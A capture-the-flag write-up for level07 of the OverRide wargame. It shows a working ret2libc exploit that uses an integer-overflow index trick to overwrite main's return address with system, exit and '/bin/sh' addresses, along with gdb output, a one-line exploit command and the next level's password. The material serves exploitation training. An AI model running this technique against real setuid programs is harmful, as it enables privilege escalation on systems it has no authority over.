# Solution

```
ret2libc
(echo -e "store\n4159090384\n2147483762\nstore\n4159040368\n115\nstore\n4160264172\n116\nquit"; cat -) | ./level07
```


## Execution

```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 42
 Index: 10
 Completed store command successfully
Input command: read
 Index: 10
 Number at data[10] is 42
 Completed read command successfully
Input command: quit
level07@OverRide:~$ 
```
-> This is a program which allows us to `store` and `read` numbers.  


## Explanation

The table is able to store 100 numbers (400 chars / 4).  
The store_number and read_number functions do not check if the index input is correct, so we can write and read outside the buffer.  
The program is memsetting the arguments and env variables, so we can not send a shellcode as an argument, nor store a shellcode in an env variable.  

We can try to do a ret2libc at the return address of main.  
We need to find the offset in order to do a buffer overflow (EIP - Address of the buffer).  

Let's try to find the address of EIP:  
Let's put a breakpoint at the call of read_number:
```
(gdb) break *0x0804892b
Breakpoint 1 at 0x804892b
(gdb) run
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: read

Breakpoint 1, 0x0804892b in main ()

(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args: 
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704,
  eip at 0xffffd70c
(gdb) i r $eax // our buffer is stored in eax,as it is the only parameter of the function
eax            0xffffd544	-10940
(gdb) p 0xffffd70c - 0xffffd544
$1 = 456
```
-> We have an offset of 456 bytes, but as we are using a buffer of ints, we have 456 / 4 = 114.  
The return address of main is stored at index 114. So we have to do a ret2libc at this index.  

```
Input command: store
 Number: 42
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```
--> 114 is not working, because 114 % 3 = 0...

However, when storing and reading, the program does a bitshifting on the index:  
`buf[index << 2] = number`  
Let's try to find a number, which will be equal to 114 after the << 2.  
```
level07@OverRide:~$ file level07 
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf5b46cdb878d5a3929cc27efbda825294de5661e, not stripped
```
-> we are in a 32bit environment:  
```
114 = 0000 0000 0000 0000 0000 0000 0111 0010
```
We can take advantage of the <<2, which is destructive.  
There are 3 possibilities:  
```
1100 0000 0000 0000 0000 0000 0111 0010 = 3221225586 % 3 = 0
1000 0000 0000 0000 0000 0000 0111 0010 = 2147483762 % 3 = 2
0100 0000 0000 0000 0000 0000 0111 0010 = 1073741938 % 3 = 1
```

With the %3 verification, only 2 options are possible:  
2147483762 and 1073741938.  

After the <<2, the highest 2 bits will be out, and we will have the following:  
```
0000 0000 0000 0000 0000 0001 1100 1000 = 456
```

By using the index 2147483762, we can store a number at index 114!  
```
Input command: store
 Number: 42
 Index: 2147483762
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 42
 Completed read command successfully
```

Let's save the system() address at index 2147483762 (which is 114), exit() address at 115 and "/bin/sh" address at index 116.  

Let's find the address of system()  
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```
0xf7e6aed0 in decimal: 4159090384.  

Address of exit();  
```
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
```
0xf7e5eb70 in decimal: 4159040368  

Let's find the address of "/bin/sh"  
```
(gdb) find &system,+999999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```
0xf7f897ec in decimal: 4160264172.  

----------->
```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store     
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$ 
```

(echo -e "store\n4159090384\n2147483762\nstore\n4159040368\n115\nstore\n4160264172\n116\nquit"; cat -) | ./level07



<!-- https://sp21.cs161.org/assets/projects/1/cheatsheet.pdf -->

/*
The ret2libc (and return oriented programming (ROP)) technique relies on overwriting the stack to create a new stack frame that calls the system function. This wikipedia article explains stack frames in great detail: https://en.wikipedia.org/wiki/Call_stack#Stack_and_frame_pointers

The stack frame dictates the order the function call and parameters are written:

function address
return address
parameters

So in your example you want to call system() with cmdstring and return to the exit() function when the system() call returns. So you write the following stack frame:

system_addr
exit_addr
cmdstring_addr

If you remove the exit address you change the stack frame to the following:

system_addr
cmdstring_addr
existingdataonstack_aka_junk

So now you're calling system() with a junk address argument and trying to return into your command string once the function completes. Which is why it fails. You can replace the exit() address with other data such as 0x41414141 which will cause a segfault once the system() call completes.
*/
